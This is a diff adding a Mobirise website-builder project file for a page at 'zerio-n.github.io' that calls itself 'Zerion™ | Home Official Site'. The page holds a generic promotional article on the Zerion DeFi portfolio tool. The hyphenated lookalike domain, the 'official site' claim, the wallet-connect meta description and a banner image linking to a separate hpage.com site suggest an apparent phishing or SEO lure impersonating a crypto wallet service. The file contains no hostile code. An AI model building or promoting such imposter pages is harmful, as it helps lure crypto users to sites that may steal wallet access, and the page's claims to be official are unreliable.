@@ -1,0 +1,147 @@
+{
+  "settings": {
+    "name": "zerion",
+    "currentPage": "index.html",
+    "theme": {
+      "name": "startm5",
+      "title": "StartM5",
+      "titlePreset": "StartM5",
+      "styling": {
+        "primaryColor": "#9fe870",
+        "secondaryColor": "#ffd7ef",
+        "successColor": "#3a341c",
+        "infoColor": "#320707",
+        "warningColor": "#a0e2e1",
+        "dangerColor": "#ffea64",
+        "mainFont": "Inter Tight",
+        "display1Font": "Inter Tight",
+        "display1Size": 5,
+        "display2Font": "Inter Tight",
+        "display2Size": 4,
+        "display5Font": "Inter Tight",
+        "display5Size": 2.5,
+        "display7Font": "Inter Tight",
+        "display7Size": 1.4,
+        "display4Font": "Inter Tight",
+        "display4Size": 1.2,
+        "isRoundedImages": true,
+        "isRoundedButtons": true,
+        "isLargeButtons": true,
+        "isGhostButtonBorder": true,
+        "underlinedLinks": false,
+        "isAnimatedOnScroll": false,
+        "isScrollToTopButton": false
+      },
+      "additionalSetColors": [
+        "#16161a"
+      ]
+    },
+    "path": "@PROJECT_PATH@",
+    "versionFirst": "5.9.0",
+    "siteFonts": [],
+    "favicon": "@PROJECT_PATH@/assets/images/zerion_1.png",
+    "imageResize": true,
+    "usedWebp": true,
+    "robotsSwitcher": true,
+    "robotsText": "User-agent: *\nDisallow: /cgi-bin\nSitemap: https://zerio-n.github.io/sitemap.xml\n\n",
+    "sitemapSwitcher": true,
+    "siteUrl": "https://zerio-n.github.io/",
+    "sitemapSwitcherAuto": "on",
+    "mbrsiteDomain": "v5yqztidah",
+    "cookiesAlert": false,
+    "gdpr": false,
+    "uniqCompNum": 2,
+    "versionPublish": "5.9.0"
+  },
+  "pages": {
+    "index.html": {
+      "settings": {
+        "main": true,
+        "title": "Zerion™ | Home Official Site",
+        "meta_descr": "Welcome to Zerion. Connect an Ethereum wallet to manage your DeFi portfolio. Connect Wallet. Explore. Favorites. Swap. Settings. Download App.",
+        "header_custom": "",
+        "footer_custom": "",
+        "html_before": ""
+      },
+      "components": [
+        {
+          "alias": false,
+          "_styles": {
+            "background-color": "@bgColor",
+            "padding-top": "(@paddingTop * 15px)",
+            "padding-bottom": "(@paddingBottom * 15px)",
+            "img": {
+              "object-fit": "contain",
+              "border-radius": "0 !important"
+            }
+          },
+          "_name": "image04",
+          "_sourceTheme": "startm5",
+          "_customHTML": "<section data-bs-version=\"5.1\" class=\"image4\" group=\"Images & Videos\">\n    <mbr-parameters>\n        <header>Size</header>\n        <input type=\"range\" inline title=\"Top\" name=\"paddingTop\" min=\"0\" max=\"10\" value=\"0\" step=\"1\">\n        <input type=\"range\" inline title=\"Bottom\" name=\"paddingBottom\" min=\"0\" max=\"10\" value=\"0\" step=\"1\">\n        <header>Show/Hide</header>\n        <input type=\"checkbox\" title=\"Caption\" name=\"showText\">\n        <header>Background</header>\n        <input type=\"color\" title=\"Color\" name=\"bgColor\" value=\"#ffffff\">\n    </mbr-parameters>\n\n    <div class=\"image-block m-auto\">\n        <a href=\"https://zerion.hpage.com/\"><img src=\"@PROJECT_PATH@/assets/images/zerion.png\" alt=\"Zerion Wallet\"></a>\n        <div mbr-if=\"showText\">\n            <p class=\"mbr-text mt-4 align-center mbr-fonts-style\" mbr-theme-style=\"display-7\" data-app-selector=\".mbr-text\">\n                Unlock your true path!\n            </p>\n        </div>\n    </div>\n</section>",
+          "_cid": "tZrpeF9NhU",
+          "_protectedParams": [],
+          "_global": false,
+          "_once": false,
+          "_params": {},
+          "_anchor": "image04-0"
+        },
+        {
+          "alias": false,
+          "_styles": {
+            "& when not (@fullScreen)": {
+              "padding-top": "(@paddingTop * 1rem)",
+              "padding-bottom": "(@paddingBottom * 1rem)"
+            },
+            "& when (@bg-type = \"color\")": {
+              "background-color": "@bg-value"
+            },
+            "& when (@bg-type = \"image\")": {
+              "background-image": "url(@bg-value)"
+            },
+            ".mbr-fallback-image.disabled": {
+              "display": "none"
+            },
+            ".mbr-fallback-image": {
+              "display": "block",
+              "background-size": "cover",
+              "background-position": "center center",
+              "width": "100%",
+              "height": "100%",
+              "position": "absolute",
+              "top": "0",
+              "& when (@bg-type = 'video')": {
+                "background-image": "url(@fallBackImage)"
+              }
+            },
+            ".card-wrapper": {
+              "background": "@wrapBgColor",
+              "@media (max-width: 767px)": {
+                "padding": "1.5rem"
+              },
+              "@media (min-width: 768px)": {
+                "padding": "2.25rem"
+              }
+            },
+            ".mbr-text, .mbr-section-btn": {
+              "color": "#ffffff",
+              "text-align": "left"
+            },
+            ".card-title, .card-box": {
+              "text-align": "left",
+              "color": "#ffffff"
+            }
+          },
+          "_name": "article07",
+          "_sourceTheme": "startm5",
+          "_customHTML": "<section data-bs-version=\"5.1\" class=\"article07\" group=\"Article\" data-bg-video=\"{{bg.type == 'video' && bg.value.url}}\" mbr-class=\"{\n    'mbr-fullscreen': fullScreen,\n    'mbr-parallax-background': bg.parallax}\">\n  <mbr-parameters>\n    <header>Size</header>\n    <input type=\"checkbox\" title=\"Full Screen\" name=\"fullScreen\">\n    <input type=\"checkbox\" title=\"Full Width\" name=\"fullWidth\" checked>\n    <input type=\"range\" inline title=\"Top\" name=\"paddingTop\" min=\"0\" max=\"10\" step=\"1\" value=\"0\">\n    <input type=\"range\" inline title=\"Bottom\" name=\"paddingBottom\" min=\"0\" max=\"10\" step=\"1\" value=\"0\">\n    <input type=\"range\" inline title=\"Content Width\" name=\"contentWidth\" min=\"8\" max=\"12\" step=\"1\" value=\"12\">\n    <header>Show/Hide</header>\n    <input type=\"checkbox\" title=\"Title\" name=\"showTitle\" checked>\n    <input type=\"checkbox\" title=\"Subtitle\" name=\"showSubtitle\">\n    <input type=\"checkbox\" title=\"Text\" name=\"showText\" checked>\n    <input type=\"checkbox\" title=\"Buttons\" name=\"showButtons\">\n    <input type=\"color\" title=\"Wrap Bg\" name=\"wrapBgColor\" value=\"#16161a\">\n    <header>Background</header>\n    <fieldset type=\"background\" name=\"bg\" parallax>\n      <input type=\"image\" title=\"Image\" value=\"../_images/background1.jpg\" parallax>\n      <input type=\"color\" title=\"Color\" value=\"#16161a\" selected>\n      <input type=\"video\" title=\"Video\" value=\"https://vimeo.com/428046504\">\n    </fieldset>\n    <header condition=\"bg.type === 'video'\">Fallback Image</header>\n    <input type=\"image\" title=\"Fallback Image\" value=\"../_images/background1.jpg\" name=\"fallBackImage\" condition=\"bg.type === 'video'\">\n    <input type=\"checkbox\" title=\"Overlay\" name=\"overlay\" condition=\"bg.type !== 'color'\" checked>\n    <input type=\"color\" title=\"Overlay Color\" name=\"overlayColor\" value=\"#ffffff\" condition=\"overlay && bg.type !== 'color'\">\n    <input type=\"range\" inline title=\"Opacity\" name=\"overlayOpacity\" min=\"0\" max=\"1\" step=\"0.1\" value=\"0.3\" condition=\"overlay && bg.type !== 'color'\">\n  </mbr-parameters>\n\n  <div class=\"mbr-fallback-image disabled\" mbr-if=\"bg.type == 'video'\"></div>\n  <div class=\"mbr-overlay\" mbr-if=\"overlay && bg.type!== 'color'\" mbr-style=\"{'opacity': overlayOpacity, 'background-color': overlayColor}\"></div>\n  <div mbr-class=\"{'container': !fullWidth, 'container-fluid': fullWidth}\">\n    <div class=\"row justify-content-center\">\n      <div class=\"card col-md-12 col-lg-{{contentWidth}}\">\n        <div class=\"card-wrapper\">\n          <h3 class=\"card-title mbr-fonts-style mbr-white mt-3 mb-4\" mbr-theme-style=\"display-2\" mbr-if=\"showTitle\" data-app-selector=\".card-title, .card-box\"><b>Zerion™ | Home Official Site</b></h3>\n          <div class=\"row card-box align-left\">\n            <div class=\"item features-without-image col-12\">\n              <div class=\"item-wrapper\">\n                <h4 class=\"mbr-section-subtitle mbr-fonts-style mb-3\" mbr-if=\"showSubtitle\" data-app-selector=\".mbr-section-subtitle\" mbr-theme-style=\"display-5\">\n                  <b>Shipping options</b>\n                </h4>\n                <p class=\"mbr-text mbr-fonts-style\" mbr-theme-style=\"display-7\" mbr-if=\"showText\" data-app-selector=\".mbr-text, .mbr-section-btn\"><b>Zerion: Unlocking the Power of Decentralized Finance Portfolio Management\n</b><br>\n<br><b>Introduction:\n</b><br>\n<br>The decentralized finance (DeFi) ecosystem has witnessed exponential growth, offering users a myriad of opportunities to invest, trade, and earn returns on their digital assets. However, navigating through various DeFi protocols, tracking investments, and managing portfolios can be a daunting task. This is where Zerion comes in—an innovative platform that provides users with a unified interface to manage their DeFi portfolios effectively. In this article, we will delve into the features, benefits, and impact of Zerion as a leading DeFi portfolio management tool, and how it empowers users to unlock the full potential of decentralized finance.\n<br>\n<br><b>Understanding Zerion:\n</b><br>a. Introduction to Zerion: <a href=\"https://zerio-n.github.io/\" class=\"text-primary\">Zerion</a> is a user-friendly DeFi portfolio management platform that aggregates information from multiple protocols and presents it in a cohesive and intuitive interface. It allows users to connect their wallets, track their investments, monitor portfolio performance, and execute transactions seamlessly across various DeFi platforms. Zerion acts as a personal financial assistant, offering a holistic view of users' DeFi holdings and simplifying their interaction with the decentralized financial ecosystem.\n<br>\n<br>b. Integration with Leading DeFi Protocols: Zerion integrates with a wide range of popular DeFi protocols, including lending platforms, decentralized exchanges, yield aggregators, liquidity pools, and more. By connecting to these protocols, Zerion provides users with real-time updates on their asset balances, transaction history, and investment performance, eliminating the need to navigate through multiple platforms individually.\n<br>\n<br>c. User-Friendly Interface: Zerion is designed with a focus on user experience, making it accessible to both seasoned DeFi enthusiasts and newcomers. The platform's intuitive interface allows users to connect their wallets effortlessly, view their diversified portfolio, track performance metrics, and execute transactions with ease. Zerion's user-friendly design reduces the complexity associated with managing DeFi investments, enabling users to make informed decisions and optimize their strategies.\n<br>\n<br><b>Key Features and Benefits of Zerion:\n</b><br>a. Comprehensive Portfolio Tracking: Zerion offers users a comprehensive and real-time view of their DeFi portfolios. Users can monitor the total value of their assets, individual token balances, historical performance, and transaction details. Zerion's portfolio tracking feature provides users with valuable insights to analyze their investment strategies, identify trends, and make data-driven decisions.\n<br>\n<br>b. Transaction Execution: Zerion simplifies the process of executing transactions across different DeFi protocols. Users can swap tokens, provide liquidity, stake assets, and participate in yield farming activities—all through a single interface. Zerion automatically routes transactions to the most efficient protocols, optimizing gas fees and saving users time and effort.\n<br>\n<br>c. Yield Farming and Staking: Zerion enables users to explore and engage in yield farming and staking activities. Users can discover the most lucrative opportunities, view expected returns, and allocate their assets accordingly. Zerion's intuitive interface and analytics tools help users maximize their yield farming strategies, ensuring optimal returns on their investments.\n<br>\n<br>d. Notifications and Alerts: Zerion provides users with customizable notifications and alerts to stay updated on important events and developments in their DeFi portfolio. Users can set alerts for price changes, yield farming opportunities, liquidity pool updates, and more. These notifications empower users to stay informed and take timely actions based on market movements.\n<br>\n<br><b>Impact and Future of Zerion:\n</b><br>a. Simplifying DeFi Portfolio Management: Zerion plays a pivotal role in simplifying the management of DeFi portfolios. By providing a unified interface, real-time tracking, and transaction execution capabilities, Zerion reduces the complexities associated with interacting with multiple DeFi protocols. This simplification enhances user experience and encourages broader adoption of decentralized finance.\n<br>\n<br>b. Empowering Decision-Making: Zerion's comprehensive portfolio tracking, performance analytics, and personalized notifications empower users to make informed investment decisions. The platform provides users with valuable insights, enabling them to assess the risks and rewards of different DeFi strategies, rebalance their portfolios, and optimize their returns. Zerion's data-driven approach enhances users' ability to navigate the dynamic DeFi landscape effectively.\n<br>\n<br>c. Collaboration and Integration: <a href=\"https://app.zerion.io/connect-wallet\" class=\"text-primary\">Zerion</a> actively collaborates with various DeFi protocols to expand its capabilities and provide users with access to a wider range of investment opportunities. The platform's commitment to integration fosters an interconnected DeFi ecosystem, where users can seamlessly leverage different protocols and diversify their investment strategies.\n<br>\n<br>d. Security and Trust: Zerion places a strong emphasis on security and user trust. The platform ensures that users retain full control of their funds by leveraging non-custodial wallets and secure smart contract interactions. Zerion prioritizes the protection of user data and implements rigorous security measures to safeguard users' personal information.\n<br>\n<br><b>Conclusion:\n</b><br>\n<br>Zerion has emerged as a powerful DeFi portfolio management tool, revolutionizing the way users interact with decentralized finance. By providing a unified interface, comprehensive portfolio tracking, transaction execution capabilities, and personalized notifications, Zerionempowers users to navigate the complex DeFi landscape with ease. The platform's user-friendly design, integration with leading protocols, and focus on security and trust have positioned Zerion as a go-to solution for managing and optimizing DeFi portfolios.\n<br>\n<br>As Zerion continues to evolve, it will play a crucial role in driving the mass adoption of decentralized finance. By simplifying portfolio management, empowering decision-making, and fostering collaboration within the DeFi ecosystem, Zerion contributes to the democratization of finance and the realization of a more inclusive and accessible financial system.\n<br>\n<br>With its commitment to user experience, security, and innovation, Zerion is at the forefront of unlocking the full potential of decentralized finance portfolio management. As the DeFi space continues to expand and mature, Zerion will remain a vital tool for both experienced users and newcomers, enabling them to harness the power of decentralized finance and achieve their financial goals in a decentralized and transparent manner.</p>\n              </div>\n            </div>\n            \n            \n            \n          </div>\n          <div mbr-buttons mbr-theme-style=\"display-7\" class=\"mbr-section-btn\" mbr-if=\"showButtons\" data-toolbar=\"-mbrBtnMove\">\n            <a class=\"btn btn-primary\" href=\"https://mobiri.se\" data-app-placeholder=\"Type Text\">Start Now</a>\n          </div>\n        </div>\n      </div>\n    </div>\n  </div>\n</section>",
+          "_cid": "tZrpfuFKyc",
+          "_anchor": "article07-1",
+          "_protectedParams": [],
+          "_global": false,
+          "_once": false,
+          "_params": {}
+        }
+      ]
+    }
+  }
+}
